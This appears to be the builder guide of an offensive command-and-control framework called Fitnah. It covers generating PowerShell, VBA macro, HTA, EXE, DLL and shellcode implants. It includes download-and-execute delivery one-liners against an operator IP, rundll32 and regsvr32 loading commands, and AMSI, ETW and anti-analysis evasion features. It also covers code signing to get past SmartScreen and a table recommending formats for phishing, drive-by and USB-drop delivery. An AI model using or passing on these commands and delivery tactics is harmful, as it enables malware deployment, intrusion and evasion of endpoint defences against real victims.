# Builder Guide

The builder pipeline generates payloads for delivery to targets. It runs **entirely on the operator machine** — the implant never builds anything.

---

## Supported Output Formats

| Format | Command | Description |
|---|---|---|
| `ps1` | `builder -f ps1` | PowerShell beacon-loop stager |
| `https-ps1` | `builder -f https-ps1` | PS1 with AMSI bypass + HTTPS beacon |
| `vba` | `builder -f vba` | VBA macro (embed in Office document) |
| `hta` | `builder -f hta` | HTML Application |
| `exe` | `builder -f exe` | Compiled C implant EXE (requires mingw-w64) |
| `dll` | `builder -f dll` | Compiled C implant DLL |
| `shellcode` | `builder -f shellcode` | Raw PIC shellcode (requires donut) |
| `turnt-relay` | `builder -f turnt-relay` | Turnt TURN-tunnel relay binary |

---

## Common Build Commands

### PowerShell stager (quickest delivery)

```
builder -f ps1 -a <agent_id>
builder -f ps1 -a abc123 --sleep 10 --jitter 20
```

Generated file: `build/fitnah_abc123_<timestamp>.ps1`

Deliver as:
```powershell
# From target host:
IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/stager.ps1')

# Or from cmd.exe:
powershell -nop -exec bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('...')"
```

### Advanced PS1 (AMSI bypass + HTTPS)

```
builder -f https-ps1 -a abc123 --profile jquery
```

Includes:
- AMSI bypass via hardware breakpoint (Dr0 on AmsiScanBuffer)
- ETW bypass (Dr1 on EtwEventWrite)
- HTTPS beacon with malleable profile headers

### VBA macro

```
builder -f vba -a abc123
```

Paste the generated `.bas` into an Excel/Word VBA editor (`Alt+F11`). The macro runs the PS1 stager via `WScript.Shell`.

### HTA (HTML Application)

```
builder -f hta -a abc123
```

Host the `.hta` file and deliver the URL. Double-clicking opens `mshta.exe` which executes the embedded script.

### EXE implant

Requires `mingw-w64` cross-compiler.

```
builder -f exe -a abc123
builder -f exe -a abc123 --arch x64 --encrypt aes-256-gcm
builder -f exe -a abc123 --encrypt none     # no encryption (debugging only)
builder -f exe -a abc123 --compress          # LZMA compress after build
```

The EXE includes:
- Sleep obfuscation (RC4 encrypts .text section during sleep)
- Hell's Gate + Halo's Gate syscall resolution
- Anti-debug, anti-VM checks
- Module unhooking

### DLL implant

```
builder -f dll -a abc123
```

Load via:
```
rundll32.exe fitnah.dll,EntryPoint
regsvr32 /s /n /u /i:http://... scrobj.dll
```

### Raw shellcode

Requires `donut` (`pip install donut-shellcode` or compiled binary in PATH).

```
builder -f shellcode -a abc123
builder -f shellcode -a abc123 --encrypt aes-256-gcm --compress
```

Output: position-independent shellcode. Inject via any loader.

Without donut installed, the builder falls back to returning the raw PE with a warning.

### Turnt relay binary

```
builder -f turnt-relay --os windows --arch amd64
builder -f turnt-relay --os windows --arch amd64 --upx     # smaller, UPX-compressed
builder -f turnt-relay --os windows --arch 386              # 32-bit
builder -f turnt-relay --os linux                           # Linux target
builder -f turnt-relay --go-build                           # compile from source
builder -f turnt-relay --list                               # list bundled assets
```

---

## Builder Options

| Option | Default | Description |
|---|---|---|
| `-f` / `--format` | required | Output format (see table above) |
| `-a` / `--agent` | required | Agent ID (used to look up Telegram group) |
| `--sleep` | `5` | Beacon interval in seconds |
| `--jitter` | `20` | ±% jitter on sleep interval |
| `--arch` | `x64` | Target architecture: `x64` \| `x86` |
| `--encrypt` | `aes-256-gcm` | Encryption: `aes-256-gcm` \| `xor` \| `none` |
| `--compress` | off | LZMA compress output artifact |
| `--mtls` | off | Bake per-agent mTLS leaf cert into implant config |
| `--sign` | off | Code-sign with signtool (Windows SDK required) |
| `--cert-path` | — | Path to `.pfx` for code signing |
| `--profile` | default | Malleable C2 profile name |
| `--out` | `build/` | Override output directory |

---

## mTLS Builds

When `--mtls` is set, the builder:

1. Calls `CertAuthority.issue(agent_id)` to generate a unique RSA-2048 leaf cert signed by the Fitnah CA
2. Bakes the cert + key PEM into the `BuildRequest`
3. The implant presents this cert on every HTTP C2 connection
4. The listener verifies it against the CA — any cert not signed by our CA is rejected
5. Burning an agent: `run burn_agent agent_id=abc123` — revokes the leaf cert without affecting others

```
builder -f exe -a abc123 --mtls
```

First build generates `data/tls/ca.crt` and `data/tls/ca.key` (never delete these). Each agent cert is saved to `data/tls/agents/<agent_id>/`.

---

## Encryption

| Mode | Algorithm | Notes |
|---|---|---|
| `aes-256-gcm` | AES-256 in GCM mode | Authenticated encryption, default |
| `xor` | Single-key XOR | Faster, less secure — use for size-constrained payloads |
| `none` | None | Debugging only, never use in production |

For EXE/DLL, the key is embedded in the binary and used to decrypt the payload at runtime. For PS1/VBA/HTA, the key is embedded in the script.

The encryption key is randomly generated per-build. Two builds of the same agent produce different encrypted payloads.

---

## Code Signing

Requires Windows SDK `signtool.exe` and a valid `.pfx` certificate.

```
builder -f exe -a abc123 --sign --cert-path cert.pfx --cert-password "P@ssword"
```

If `signtool` is not found in PATH, the builder checks common SDK install paths:
```
C:\Program Files (x86)\Windows Kits\10\bin\x64\signtool.exe
C:\Program Files\Windows Kits\10\bin\x64\signtool.exe
```

Produces a Digicert-timestamped PE — passes Windows SmartScreen.

---

## Build Output

Every build prints a summary:

```
[OK] build/fitnah_abc123_1718700000.exe
     Size      : 142,336 bytes
     SHA256    : a1b2c3d4...
     WARN      : donut unavailable, returning PE
```

The `.sha256` value and artifact path are recorded in the audit log.

---

## Checking Your Cross-Compiler

```bash
x86_64-w64-mingw32-gcc --version
# x86_64-w64-mingw32-gcc (GCC) 12.2.0
```

If not found, see [Installation Guide](INSTALLATION.md#step-5--cross-compiler-for-c-implant-builds).

---

## Payload Delivery Tips

| Scenario | Recommended format |
|---|---|
| Phishing email attachment | `vba` (Word/Excel) or `hta` |
| Web delivery / drive-by | `hta` or `ps1` via `delivery_server` plugin |
| USB drop | `exe` with realistic icon + name |
| In-memory (no disk touch) | `shellcode` |
| Persistence via service | `dll` or `exe` |
| Constrained targets (PS blocked) | `exe` or `dll` |
| C2 over HTTPS (corp proxy) | `https-ps1` with `--profile jquery` |
